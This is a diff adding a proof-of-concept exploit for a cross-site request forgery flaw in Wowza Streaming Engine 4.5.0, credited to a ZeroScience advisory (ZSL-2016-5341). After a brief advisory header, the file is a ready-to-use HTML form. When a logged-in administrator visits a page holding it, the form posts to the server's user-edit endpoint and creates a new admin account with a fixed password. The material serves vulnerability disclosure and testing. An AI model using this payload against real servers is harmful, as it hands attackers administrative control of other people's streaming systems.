@@ -1,0 +1,52 @@
+<!--
+﻿Wowza Streaming Engine 4.5.0 CSRF Add Advanced Admin Exploit
+
+
+Vendor: Wowza Media Systems, LLC.
+Product web page: https://www.wowza.com
+Affected version: 4.5.0 (build 18676)
+Platform: JSP
+
+Summary: Wowza Streaming Engine is robust, customizable, and scalable
+server software that powers reliable video and audio streaming to any
+device. Learn the benefits of using Wowza Streaming Engine to deliver
+high-quality live and on-demand video content to any device.
+
+Desc: The application interface allows users to perform certain actions
+via HTTP requests without performing any validity checks to verify the
+requests. This can be exploited to perform certain actions with administrative
+privileges if a logged-in user visits a malicious web site.
+
+Tested on: Winstone Servlet Engine v1.0.5
+           Servlet/2.5 (Winstone/1.0.5)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5341
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5341.php
+
+
+03.07.2016
+
+--
+-->
+
+<html>
+  <body>
+    <form action="http://localhost:8088/enginemanager/server/user/edit.htm" method="POST">
+      <input type="hidden" name="version" value="0" />
+      <input type="hidden" name="action" value="new" />
+      <input type="hidden" name="userName" value="thricer" />
+      <input type="hidden" name="userPassword" value="123123" />
+      <input type="hidden" name="userPassword2" value="123123" />
+      <input type="hidden" name="accessLevel" value="admin" />
+      <input type="hidden" name="advUser" value="true" />
+      <input type="hidden" name="&#95;advUser" value="on" />
+      <input type="hidden" name="ignoreWarnings" value="false" />
+      <input type="submit" value="Execute" />
+    </form>
+  </body>
+</html>
